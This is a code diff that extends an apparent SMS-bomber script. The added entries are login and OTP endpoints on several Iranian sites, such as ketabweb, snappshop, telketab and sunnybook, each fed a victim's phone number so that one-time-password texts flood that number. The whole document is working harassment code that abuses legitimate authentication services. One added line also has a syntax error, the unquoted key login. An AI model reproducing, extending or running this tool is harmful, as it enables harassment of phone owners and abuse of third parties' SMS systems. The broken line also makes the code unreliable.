@@ -2,6 +2,11 @@ def send_otp_requests(number):
     url_payload_map = {
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
         'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
+        'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
+        'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
+        'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,login:'1'}),
+        'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0'+number+'&OtpSmsType=1', None),
+        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', {'mobile': '0' + number}),
         'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
         'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
         'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
@@ -98,6 +103,27 @@ def send_otp_requests(number):
         'digistyle': ('https://www.digistyle.com/users/login-register/', {
             'loginRegister[email_phone]': '0' + number,
         }),
+        'telketab': ('https://telketab.com/opt_field/check_secret', {
+            'identity': '0' + number,
+            'secret': '',
+            'plugin': 'otp_field_sms_processor',
+            'key': 'otp_field_user_auth_form__otp_sms',
+        }),
+        'adinehbook': ('https://www.adinehbook.com/gp/flex/sign-in.html', {
+            'action': 'sign',
+            'phone_cell_or_email': '0' + number,
+        }),
+        'gitamehr': ('https://gitamehr.ir/wp-admin/admin-ajax.php', {
+            'action': 'stm_login_register',
+            'type': 'mobile',
+            'input': '0' + number,
+        }),
+        'sunnybook': ('https://sunnybook.ir/Home/RegisterUser', {
+            'name': 'Mr',
+            'password': '123456',
+            'mobile': number,
+        }),
+        
     }
 
     return list(url_payload_map.values())
